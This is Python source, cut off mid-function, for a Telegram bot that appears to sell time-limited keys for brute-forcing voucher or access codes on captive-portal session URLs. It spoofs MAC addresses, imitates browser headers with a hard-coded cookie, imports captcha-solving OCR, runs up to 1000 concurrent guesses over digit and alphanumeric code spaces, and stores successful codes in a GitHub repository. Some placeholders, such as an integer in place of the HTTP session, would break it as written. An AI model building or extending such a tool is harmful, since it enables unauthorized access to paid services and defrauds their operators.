import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, logging, secrets
from logging.handlers import RotatingFileHandler
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
from urllib.parse import urlparse
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
ADMIN_ID = os.environ.get("ADMIN_ID", "").strip()
ADMIN_DISPLAY = "@SPEED_Fast67"

LOG_FILE = os.environ.get("BOT_LOG_FILE", "bot.log")
logger = logging.getLogger("koo_bot")
logger.setLevel(logging.INFO)
if not logger.handlers:
    formatter = logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s")
    file_handler = RotatingFileHandler(
        LOG_FILE, maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
    )
    file_handler.setFormatter(formatter)
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

REPO_OWNER = os.environ.get("REPO_OWNER", "")
REPO_NAME = os.environ.get("REPO_NAME", "")
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
scan_stats = {}
session = 1000
_connector = 1000
CONCURRENCY = 1000
_voucher_sem = 1000
_start_time = time.monotonic()
PROXY_URL = os.environ.get("PROXY_URL", "").strip()
KEY_STORE_FILE = "generated_keys.json"
PAID_USERS_FILE = "paid_users.json"


def proxy_request_kwargs():
    """Return per-request proxy settings; empty means direct connection."""
    if not PROXY_URL:
        return {}
    proxy = PROXY_URL if "://" in PROXY_URL else "http://" + PROXY_URL
    return {"proxy": proxy}

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    timeout = aiohttp.ClientTimeout(total=20, connect=8, sock_read=15)
    last_error = None
    for attempt in range(1, 4):
        try:
            async with session.get(
                url,
                headers=headers,
                timeout=timeout,
                **proxy_request_kwargs(),
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    content = base64.b64decode(data['content']).decode('utf-8')
                    return json.loads(content), data['sha']
                if response.status in {429, 500, 502, 503, 504} and attempt < 3:
                    retry_after = response.headers.get("Retry-After")
                    delay = float(retry_after) if retry_after else min(2 ** (attempt - 1), 4)
                    logger.warning(
                        "GitHub fetch %s returned HTTP %s; retrying in %.1fs",
                        path, response.status, delay,
                    )
                    await asyncio.sleep(delay)
                    continue
                logger.warning("GitHub fetch %s returned HTTP %s", path, response.status)
                return {}, None
        except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
            last_error = exc
            if attempt < 3:
                delay = min(2 ** (attempt - 1), 4)
                logger.warning(
                    "GitHub fetch %s failed on attempt %s/3 with %s; retrying in %ss",
                    path, attempt, type(exc).__name__, delay,
                )
                await asyncio.sleep(delay)
    logger.error(
        "GitHub fetch %s failed after 3 attempts: %s",
        path, type(last_error).__name__ if last_error else "unknown",
    )
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload, **proxy_request_kwargs()) as response:
        return await response.text()

def main_menu_markup():
    k = InlineKeyboardMarkup(row_width=2)
    k.add(
        InlineKeyboardButton("💳 PAID USER", callback_data="paid_user"),
        InlineKeyboardButton("🔗 INPUT", callback_data="input_prompt"),
        InlineKeyboardButton("🟢 PROXY", callback_data="proxy_status"),
        InlineKeyboardButton("📋 SUCCESS CODES", callback_data="success_codes"),
        InlineKeyboardButton("🔄 RECHECK", callback_data="recheck"),
        InlineKeyboardButton("🔑 KEY", callback_data="key_menu"),
        InlineKeyboardButton("🛑 SCAN", callback_data="scan_menu"),
    )
    return k


def key_menu_markup():
    k = InlineKeyboardMarkup(row_width=2)
    k.add(
        InlineKeyboardButton("30m", callback_data="key:30m"),
        InlineKeyboardButton("1hr", callback_data="key:1hr"),
        InlineKeyboardButton("3hr", callback_data="key:3hr"),
        InlineKeyboardButton("1d", callback_data="key:1d"),
        InlineKeyboardButton("30d", callback_data="key:30d"),
        InlineKeyboardButton("⬅️ Back", callback_data="main"),
    )
    return k


def proxy_status_text():
    # aiohttp uses direct connection automatically when no proxy is configured.
    if not PROXY_URL:
        return "🔵 Proxy Status: DIRECT\n✅ Proxy မသုံးဘဲ တိုက်ရိုက်ချိတ်ဆက်နေပါသည်။"
    return "🟢 Proxy Status: ON"


def _load_paid_users():
    try:
        with open(PAID_USERS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return {}


def _save_paid_users(data):
    tmp = PAID_USERS_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    os.replace(tmp, PAID_USERS_FILE)


def _paid_record_active(record):
    if not isinstance(record, dict):
        return False
    expiry = record.get("expires_at")
    if expiry == "9999-12-31T23:59:59Z":
        return True
    try:
        expiry_dt = datetime.fromisoformat(str(expiry).replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < expiry_dt
    except (TypeError, ValueError, OverflowError):
        return False


def activate_paid_key(user_id, raw_key):
    key = str(raw_key or "").strip().upper()
    store = _load_generated_keys()
    record = store.get(key)
    if not isinstance(record, dict):
        return None, "INVALID"
    bound_user = record.get("used_by")
    user_id = str(user_id)
    if bound_user and str(bound_user) != user_id:
        return None, "USED"
    if not _paid_record_active(record):
        return None, "EXPIRED"

    now = datetime.now(timezone.utc).isoformat()
    if not bound_user:
        record["used_by"] = user_id
        record["used_at"] = now
        record["status"] = "USED"
        store[key] = record
        _save_generated_keys(store)

    paid_users[user_id] = {
        "key": key,
        "plan": record.get("duration", "unknown"),
        "expires_at": record.get("expires_at"),
        "activated_at": now,
    }
    _save_paid_users(paid_users)
    return paid_users[user_id], "OK"


paid_users = _load_paid_users()


def _load_generated_keys():
    try:
        with open(KEY_STORE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return {}


def _save_generated_keys(data):
    tmp = KEY_STORE_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    os.replace(tmp, KEY_STORE_FILE)


def _generate_paid_key(duration):
    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    key = f"{''.join(secrets.choice(alphabet) for _ in range(3))}:{''.join(secrets.choice(alphabet) for _ in range(3))}"
    now = datetime.now(timezone.utc)
    durations = {"30m": timedelta(minutes=30), "1hr": timedelta(hours=1), "3hr": timedelta(hours=3), "1d": timedelta(days=1), "30d": timedelta(days=30)}
    store = _load_generated_keys()
    while key in store:
        key = f"{''.join(secrets.choice(alphabet) for _ in range(3))}:{''.join(secrets.choice(alphabet) for _ in range(3))}"
    store[key] = {"duration": duration, "created_at": now.isoformat(), "expires_at": (now + durations[duration]).isoformat(), "status": "ACTIVE"}
    _save_generated_keys(store)
    return key



def scan_menu_markup():
    k = InlineKeyboardMarkup(row_width=2)
    k.add(
        InlineKeyboardButton("🔢 Scan 6", callback_data="scan:6"),
        InlineKeyboardButton("🔢 Scan 7", callback_data="scan:7"),
        InlineKeyboardButton("🔢 Scan 8", callback_data="scan:8"),
        InlineKeyboardButton("🔤 ASCII Lower", callback_data="scan:ascii-lower"),
        InlineKeyboardButton("🔤 ALL", callback_data="scan:all"),
        InlineKeyboardButton("⚙️ Custom", callback_data="scan:custom"),
        InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop"),
        InlineKeyboardButton("⬅️ Back", callback_data="main"),
    )
    return k


def has_paid_access(user_id):
    return (
        str(user_id).strip() == ADMIN_ID
        or _paid_record_active(paid_users.get(str(user_id)))
    )


def menu_status(user):
    uid = user.id
    data = user_data.setdefault(uid, {})
    registration = "🟢 REGISTERED" if data.get("session_url") else "🔴 NOT REGISTERED"
    proxy_state = "🟢 ON" if PROXY_URL else "🔴 NOT CONFIGURED"
    paid_state = "✅ YES" if has_paid_access(uid) else "❌ NO"
    return (
        "👁️🔴👁️\n"
        "𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐄𝐘𝐄𝐒\n"
        "👁️🟣👁️\n\n"
        "⚔️ GOJO × SUKUNA\n"
        "🌀 OBITO × ITACHI\n\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "👁️‍🗨️ 六眼 SIX EYES\n"
        "➤ 🟣 ∞ INFINITY\n\n"
        "👁️🔴 MANGEKYŌ SHARINGAN\n"
        "➤ 🔥 ITACHI\n\n"
        "👁️🌀 KAMUI\n"
        "➤ ⚫ OBITO\n\n"
        "👁️‍🗨️👹 SUKUNA\n"
        "➤ 🔴 CURSED POWER\n\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 {user.first_name or 'Unknown'}\n"
        f"🆔 \"{uid}\"\n\n"
        f"⚠️ REGISTER ➜ {registration}\n"
        f"🌐 PROXY ➜ {proxy_state}\n"
        f"💳 PAID ➜ {paid_state}\n\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "👨‍💻 ADMIN\n"
        f"➤ \"{ADMIN_DISPLAY}\"\n\n"
        "👁️🔴 SHARINGAN × 🟣 SIX EYES 👁️\n"
        "⚡ ANIME POWER SYSTEM ONLINE ⚡"
    )


@bot.message_handler(commands=['start'])
async def start(message):
    approve[message.chat.id] = True
    user_data.setdefault(message.chat.id, {})
    await bot.send_message(message.chat.id, menu_status(message.from_user), reply_markup=main_menu_markup())

@bot.message_handler(commands=['key'])
async def handle_key(message):
    if str(message.chat.id).strip() != ADMIN_ID:
        await bot.reply_to(message, "⛔ Admin only.")
        return
    await bot.reply_to(message, "🔑 Key duration ရွေးပါ။", reply_markup=key_menu_markup())



@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete key for {user_id}"
        )
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(
            message,
            f" Key Deleted\n\nUSER ID : {user_id}"
        )
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(
                message,
                "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited"
            )
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Add key for {user_id}"
        )
        await bot.reply_to(
            message,
            f" Key Generated\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"EXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    results, _ = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join(results[chat_id_str])
        await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
    else:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(
                expiry.replace("Z", "+00:00")
            )
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(
            int,
            expiration_time.split('-')
        )
        expiration_dt = datetime(
            year=yyyy,
            month=MM,
            day=dd,
            hour=hh,
            minute=mm,
            second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    user_data.setdefault(chat_id, {})
    results, sha = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
            if "session_url" not in user_data[message.chat.id]:
                await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
                return
            if "session_url" not in user_data[message.chat.id]:
                await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
                return
            codes = results[chat_id_str]
            await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
            session_url_recheck = user_data[message.chat.id]["session_url"]
            recheck_list = []
            for code in codes:
                recode = await perform_check(
                    session_url_recheck,
                    code,
                    chat_id,
                    scan_id=None,
                    recheck=True,
                    message=message
                )
                if recode:
                    recheck_list.append(recode)
            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
            await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
            await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

def valid_https_url(value):
    try:
        parsed = urlparse(str(value or "").strip())
        return parsed.scheme == "https" and bool(parsed.netloc) and not parsed.username and not parsed.password
    except (TypeError, ValueError):
        return False


def extract_session_id(value):
    """Extract sessionId from a URL, fragment, or response text."""
    from urllib.parse import urlparse, parse_qs, unquote

    value = unquote(str(value or ""))
    for candidate in (value, urlparse(value).query, urlparse(value).fragment):
        params = parse_qs(candidate)
        for key in ("sessionId", "sessionid"):
            if params.get(key) and params[key][0].strip():
                return params[key][0].strip()
    match = re.search(
        r"[\"']?(?:sessionId|sessionid)[\"']?\s*[=:]\s*[\"']?([A-Za-z0-9._~-]{8,})",
        value,
        re.IGNORECASE,
    )
    return match.group(1) if match else None


async def check_session_url(session_url):
    from urllib.parse import urlparse

    session_url = session_url.strip().rstrip('.,)>]')
    if not re.match(r"^https?://", session_url, re.IGNORECASE):
        session_url = "https://" + session_url
    parsed_url = urlparse(session_url)
    hostname = (parsed_url.hostname or "").lower()
    if parsed_url.scheme != "https" or not hostname:
        return False

    # Short links and regional portal hosts may redirect to the actual portal.
    # Keep the original URL for storage and refresh MAC only for the probe.
    request_url = replace_mac(session_url, new_mac=get_mac())

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(request_url, allow_redirects=True, headers=headers, **proxy_request_kwargs()) as response:
            final_url = str(response.url)
            response_text = await response.text(errors="ignore")
            found_session_id = (
                extract_session_id(final_url)
                or extract_session_id(request_url)
                or extract_session_id(response_text)
            )
            print(
                f"Session URL probe: status={response.status}, "
                f"final_host={urlparse(final_url).hostname}, "
                f"session_id_found={bool(found_session_id)}"
            )

            # sessionId may appear only during the later session request.
            # URL syntax is valid, so defer the definitive check to scanning.
            return True
    except (aiohttp.InvalidURL, aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
        # Do not report a false invalid URL because the portal is temporarily
        # unavailable during the input step.
        print(f"Session URL probe deferred: {type(exc).__name__}: {exc}")
        return True

@bot.message_handler(commands=['input'])
async def handle_input(message):
    if not has_paid_access(message.chat.id):
        await bot.reply_to(message, "⛔ Active Paid User key လိုအပ်ပါသည်။\n💳 PAID USER မှတစ်ဆင့် key ကို အရင်ထည့်ပါ။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/input your_session_url"
        )
        return
    url = args[1].strip().rstrip('.,)>]')
    if not url.lower().startswith("https://"):
        await bot.reply_to(message, "❌ HTTPS Session URL ကိုသာ အသုံးပြုပါ။")
        return
    if not valid_https_url(url):
        await bot.reply_to(message, "❌ Session URL format မမှန်ကန်ပါ။")
        return
    user_data.setdefault(message.chat.id, {})
    if message.chat.id in user_data:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "✅ Session URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nအောက်က Scan Mode ကိုရွေးပြီး စတင်နိုင်ပါတယ်။", reply_markup=scan_menu_markup())
        else:
            await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>"
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    approve[chat_id] = True
    user_data.setdefault(chat_id, {})
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if (
        chat_id in scan_tasks
        and not scan_tasks[chat_id]["task"].done()
    ):
        await bot.reply_to(
            message,
            "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။"
        )
        return

    progress_msg = await bot.send_message(
        chat_id,
        "🔍Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }

@bot.callback_query_handler(func=lambda call: True)
async def menu_callback(call):
    try:
        await bot.answer_callback_query(call.id)
        chat_id = call.message.chat.id
        data = call.data or ""
        if data == "main":
            await bot.edit_message_text(
                menu_status(call.from_user), chat_id, call.message.message_id,
                reply_markup=main_menu_markup()
            )
        elif data == "scan_menu":
            await bot.edit_message_text(
                "🛑 Scan Mode ကိုရွေးပါ။", chat_id, call.message.message_id,
                reply_markup=scan_menu_markup()
            )
        elif data == "input_prompt":
            if not has_paid_access(chat_id):
                await bot.edit_message_text(
                    "⛔ Active Paid User key လိုအပ်ပါသည်။\n💳 PAID USER ကို အရင်နှိပ်ပြီး key ထည့်ပါ။",
                    chat_id, call.message.message_id, reply_markup=main_menu_markup()
                )
            else:
                await bot.edit_message_text(
                    "🔗 Portal URL ထည့်ရန်:\n\n/input [your_portal_url]\n\nဥပမာ: /input https://example.com/...",
                    chat_id, call.message.message_id, reply_markup=main_menu_markup()
                )
        elif data == "key_menu":
            if str(chat_id).strip() != ADMIN_ID:
                await bot.edit_message_text("⛔ Admin only.", chat_id, call.message.message_id, reply_markup=main_menu_markup())
            else:
                await bot.edit_message_text("🔑 Key duration ရွေးပါ။", chat_id, call.message.message_id, reply_markup=key_menu_markup())
        elif data.startswith("key:"):
            if str(chat_id).strip() != ADMIN_ID:
                await bot.edit_message_text("⛔ Admin only.", chat_id, call.message.message_id, reply_markup=main_menu_markup())
            else:
                duration = data.split(":", 1)[1]
                key = _generate_paid_key(duration)
                labels = {"30m": "30 Minutes", "1hr": "1 Hour", "3hr": "3 Hours", "1d": "1 Day", "30d": "30 Days"}
                await bot.edit_message_text(
                    f"🔑 Key: {key}\n⏳ Duration: {labels.get(duration, duration)}",
                    chat_id, call.message.message_id, reply_markup=key_menu_markup()
                )
        elif data.startswith("scan:"):
            mode = data.split(":", 1)[1]
            if mode == "custom":
                await bot.edit_message_text(
                    "⚙️ Custom mode အတွက် /scan <mode> ကို အသုံးပြုပါ။",
                    chat_id, call.message.message_id, reply_markup=scan_menu_markup()
                )
                return
            call.message.text = f"/scan {mode}"
            await bot.edit_message_text(
                f"🔍 Scan Mode: {mode}\nစတင်နေပါသည်...",
                chat_id, call.message.message_id
            )
            await scan(call.message)
        elif data == "stop":
            await stop_scan(call.message)
        elif data == "recheck":
            await recheck(call.message)
        elif data == "success_codes":
            await handle_result(call.message)
        elif data == "proxy_status":
            await bot.edit_message_text(
                proxy_status_text(),
                chat_id, call.message.message_id, reply_markup=main_menu_markup()
            )
        elif data in {"paid_user", "paid", "paid_user_menu"}:
            if str(chat_id).strip() == ADMIN_ID:
                user_data.setdefault(chat_id, {})["awaiting_paid_key"] = False
                await bot.edit_message_text(
                    "💳 PAID USER\n\n👨‍💻 Admin account\n✅ Paid access is permanent.\n🔑 Key ထည့်ရန် မလိုပါ။",
                    chat_id, call.message.message_id, reply_markup=main_menu_markup()
                )
            else:
                user_data.setdefault(chat_id, {})["awaiting_paid_key"] = True
                await bot.edit_message_text(
                    "💳 PAID USER\n\n🔑 Admin ထုတ်ပေးထားသော key ကို ပို့ပါ။\nဥပမာ: YLQ:BLJ",
                    chat_id, call.message.message_id, reply_markup=main_menu_markup()
                )
    except Exception:
        logger.exception("Menu callback failed: %s", getattr(call, "data", None))

@bot.message_handler(commands=['paid'])
async def paid_command(message):
    if str(message.chat.id).strip() == ADMIN_ID:
        user_data.setdefault(message.chat.id, {})["awaiting_paid_key"] = False
        await bot.reply_to(
            message,
            "💳 PAID USER\n\n👨‍💻 Admin account\n✅ Paid access is permanent.\n🔑 Key ထည့်ရန် မလိုပါ။",
            reply_markup=main_menu_markup(),
        )
        return
    user_data.setdefault(message.chat.id, {})["awaiting_paid_key"] = True
    await bot.reply_to(
        message,
        "💳 PAID USER\n\n🔑 Admin ထုတ်ပေးထားသော key ကို ပို့ပါ။\nဥပမာ: YLQ:BLJ",
        reply_markup=main_menu_markup(),
    )


@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get("awaiting_paid_key", False), content_types=['text'])
async def paid_key_input(message):
    user_id = message.chat.id
    user_data.setdefault(user_id, {})["awaiting_paid_key"] = False
    record, status = activate_paid_key(user_id, message.text)
    if status == "OK":
        await bot.reply_to(
            message,
            f"✅ Paid key activated successfully.\n📋 Plan: {record.get('plan', 'Unknown')}\n⏳ Expires: {record.get('expires_at', 'Unknown')}",
            reply_markup=main_menu_markup(),
        )
    elif status == "USED":
        await bot.reply_to(message, "❌ ဒီ key ကို အခြား user တစ်ဦးက အသုံးပြုပြီးပါပြီ။", reply_markup=main_menu_markup())
    elif status == "EXPIRED":
        await bot.reply_to(message, "❌ ဒီ key သက်တမ်းကုန်ဆုံးသွားပါပြီ။", reply_markup=main_menu_markup())
    else:
        await bot.reply_to(message, "❌ Key မှားယွင်းနေပါသည်။ Admin ထုတ်ပေးထားသော key ကို ပြန်စစ်ပါ။", reply_markup=main_menu_markup())


@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(
        1 for data in scan_tasks.values()
        if not data["task"].done()
    )
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(60)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content(
                    "result.json",
                    results,
                    sha,
                    "Periodic Update"
                )
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
